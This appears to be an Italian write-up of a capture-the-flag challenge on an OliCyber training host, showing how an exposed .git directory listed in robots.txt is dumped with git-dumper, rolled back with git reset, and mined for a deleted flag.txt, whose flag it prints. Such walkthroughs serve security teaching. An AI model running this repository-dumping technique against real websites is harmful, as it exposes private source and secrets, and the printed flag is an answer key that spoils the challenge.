@@ -1,0 +1,40 @@
+- Hint 1: Forse l'autore si è dimenticato di togliere una cartella che permette di tornare "indietro" nella storia?
+
+- Hint 2: Hai dato un occhio a /robots.txt?
+
+- Aprendo http://iforgot.challs.olicyber.it/robots.txt vediamo:
+User-agent: *
+Disallow: /index.js
+Disallow: /package.json
+Disallow: /.git
+
+- Per aprire la cartella git ho usato questo tool: https://github.com/arthaud/git-dumper
+
+- Una volta scaricato il tool con il comando "git-dumper http://iforgot.challs.olicyber.it/.git info" ho scaricato nella cartella info la repository
+
+- Dopo aver scaricato il tutto nella cartella bisogna entrarci e successivamente entrare in .git (cd .git)
+
+- Adesso con il comando "git log" si puo vedere:
+username@DESKTOP-0J8PUV6:~/info/.git$ git log
+commit 4f1809c610bd50d01e95de0a2996616dd883a150 (HEAD -> master)
+Author: SuperHacker11 <super@hackerz.real>
+Date:   Mon May 8 15:09:48 2023 +0000
+
+    removed flag
+
+commit 0301e39a0bf00fc755eb680440eec6daa7abcdbf
+Author: SuperHacker11 <super@hackerz.real>
+Date:   Mon May 8 15:09:48 2023 +0000
+
+    add challenge
+
+- Dato che noi vogliamo la flag il nostro obbiettivo è tornare a quando è stata aggiunta la challenge, per fare questo usciamo da .git (cd ..) e utilizziamo il seguente comando: git reset --hard 0301e39a0bf00fc755eb680440eec6daa7abcdbf
+
+- Se fatto correttamente uscirà una risposta del genere:
+HEAD is now at 0301e39 add challenge
+
+- Facendo un ls:
+username@DESKTOP-0J8PUV6:~/info$ ls
+flag.txt  index.js  package-lock.json  package.json  robots.txt
+
+- Possiamo notare che adesso abbiamo la flag, quindi con un semplice "cat flag.txt" otteniamo:  flag{0h_r34lly_d1d_u_f0rg0t_t0_r3m0v3_th3_d0t_g1t_r3p0?!}
